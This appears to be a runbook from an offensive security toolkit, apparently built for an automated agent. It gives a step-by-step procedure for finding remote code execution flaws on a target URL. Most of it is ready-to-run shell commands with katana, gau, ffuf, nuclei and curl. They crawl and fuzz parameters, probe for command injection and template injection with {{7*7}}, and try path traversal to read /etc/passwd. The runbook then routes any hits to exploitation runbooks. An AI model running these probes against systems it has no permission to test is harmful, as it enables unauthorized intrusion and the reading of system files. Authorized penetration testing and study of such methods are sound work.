# RCE Discovery Runbook

## Purpose
Discover whether command injection, SSTI, deserialization, LFI/RFI, or log poisoning vectors exist on the target.

## Variables
- `$TARGET_URL` — base URL or endpoint (e.g., `https://target.com/page`)
- `$OUTDIR` — output directory (e.g., `./output/target/2026-05-04`)
- `$WORDLIST_DIR` — path to wordlists dir (e.g., `./wordlists`)

## Step 1 — Parameter Discovery

### W1A. Crawl for parameters with katana
```bash
katana -u "$TARGET_URL" -jc -kf all -d 3 -silent -field query | sort -u > "$OUTDIR/rce-params-katana.txt"
```

### W1B. Wayback URL parameter extraction
```bash
gau "$TARGET_URL" | grep -E '[?&][a-zA-Z0-9_-]+=' | sed 's/.*[?&]\([a-zA-Z0-9_-]*\)=.*/\1/' | sort -u > "$OUTDIR/rce-params-wayback.txt"
```

### W1C. Deduplicated parameter list
```bash
sort -u "$OUTDIR/rce-params-katana.txt" "$OUTDIR/rce-params-wayback.txt" > "$OUTDIR/rce-params-all.txt"
```

## Step 2 — Detect Reflected Parameter Values

### W2A. Reflection test via httpx + grep
```bash
while read -r param; do
  curl -sk "https://target.com/page?$param=rcecheck$(date +%s)" -o "$OUTDIR/rce-reflect-$param.txt"
  grep -q "rcecheck" "$OUTDIR/rce-reflect-$param.txt" && echo "REFLECTED: $param" >> "$OUTDIR/rce-reflected-params.txt"
done < "$OUTDIR/rce-params-all.txt"
```

### W2B. If no specific params found, use common RCE-prone param names
```bash
ffuf -u "$TARGET_URL?FUZZ=test" -w "$WORDLIST_DIR/fuzz/rce-params.txt" -mc 200 -mr "test" -o "$OUTDIR/rce-param-discovery.json"
```

## Step 3 — Command Injection Fuzzing (Broad)

### W3A. ffuf command injection fuzzing
```bash
ffuf -u "$TARGET_URL?cmd=FUZZ" -w "$WORDLIST_DIR/fuzz/cmd-injection.txt" -mr "root:|uid=|www-data|SYSTEM:" -mc 200 -o "$OUTDIR/rce-cmd-injection-ffuf.json"
```

### W3B. nuclei command injection templates
```bash
nuclei -u "$TARGET_URL" -t ~/nuclei-templates/vulnerabilities/generic/command-injection-* -o "$OUTDIR/rce-nuclei-cmd-injection.txt"
```

## Step 4 — SSTI Polyglot Probe

### W4A. SSTI polyglot injection
```bash
curl -sk "$TARGET_URL?name={{7*7}}" -o "$OUTDIR/rce-ssti-jinja.txt"
```

### W4B. Check output for SSTI evaluation
```bash
grep -E '49|7777777' "$OUTDIR/rce-ssti-jinja.txt" && echo "SSTI detected: $TARGET_URL" >> "$OUTDIR/rce-ssti-findings.txt"
```

## Step 5 — LFI Discovery

### W5A. LFI path traversal probe
```bash
while read -r param; do
  curl -sk "$TARGET_URL?$param=../../etc/passwd" -o "$OUTDIR/rce-lfi-$param.txt"
  grep -q "root:x:" "$OUTDIR/rce-lfi-$param.txt" && echo "LFI: $TARGET_URL?$param" >> "$OUTDIR/rce-lfi-findings.txt"
done < "$OUTDIR/rce-params-all.txt"
```

### W5B. nuclei LFI templates
```bash
nuclei -u "$TARGET_URL" -t ~/nuclei-templates/vulnerabilities/generic/local-file-include* -o "$OUTDIR/rce-nuclei-lfi.txt"
```

## Step 6 — File Upload for RCE Vectors

### W6A. Discover upload endpoints
```bash
katana -u "$TARGET_URL" -jc -d 3 -silent -field url | grep -iE 'upload|file|import|avatar|profile' | sort -u > "$OUTDIR/rce-upload-endpoints.txt"
```

## Signals
| Signal | Indicates |
|---|---|
| `root:x:0:0:root` in response body | LFI confirmed |
| `49` or `7777777` in response | SSTI confirmed (Jinja2/Twig) |
| `uid=` or `uid=0(root)` or `SYSTEM` in response | Command injection confirmed |
| Reflection of `rcecheck` in response | Parameter is reflected — candidate for RCE |

## Next Routing
- If command injection signal → `runbooks/02-probe.md` (RCE command injection path)
- If SSTI signal → `runbooks/02-probe.md` (SSTI path)
- If LFI signal → `runbooks/02-probe.md` (LFI/RFI path)
- If upload endpoint found → route to `file-upload` skill runbooks
- If no signals → check for deserialization endpoints, or stop with negative finding